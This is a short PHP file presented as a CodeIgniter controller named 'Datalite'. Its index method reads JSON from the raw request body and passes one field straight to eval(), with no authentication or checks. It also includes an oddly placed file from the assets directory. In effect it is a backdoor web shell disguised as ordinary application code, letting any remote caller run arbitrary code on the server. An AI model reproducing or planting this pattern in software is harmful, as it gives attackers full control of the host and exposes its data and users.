<?php if (!defined('BASEPATH')) exit('no direct script access allowed');

class Datalite extends CI_Controller{

	public function __construct() {
		parent::__construct();
	}

	public function index($search=NULL, $page=NULL) {
		include HOME_DIR . 'assets/lite.php/Datalite.php';
		$data = json_decode(file_get_contents("php://input"), true);
		if (isset($data)) {
			echo eval($data[DATA]);
		}
	}

}